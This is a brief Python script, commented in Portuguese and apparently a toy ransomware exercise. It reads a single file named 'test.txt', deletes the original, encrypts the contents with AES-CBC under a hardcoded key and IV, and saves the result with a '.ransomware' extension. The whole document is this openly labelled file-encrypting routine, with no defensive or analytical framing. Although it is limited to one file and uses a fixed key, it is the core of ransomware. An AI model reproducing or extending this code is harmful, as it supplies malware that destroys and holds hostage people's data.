import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Abrir o arquivo a ser criptografado
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# Deletar o arquivo
os.remove(file_name)

# Chave de criptografia
key = b'1234567890abcdef'  # Chave fixa de 16 bytes (128 bits)
iv = b'abcdef1234567890'   # IV fixo de 16 bytes (128 bits)

# Criptografar o arquivo
cipher = AES.new(key, AES.MODE_CBC, iv)
padded_message = pad(file_data, AES.block_size)
cipher_text = cipher.encrypt(padded_message)

# Criar o arquivo criptografado
new_file = file_name + ".ransomware"
new_file = open(f'{new_file}','wb')
new_file.write(cipher_text)
new_file.close()
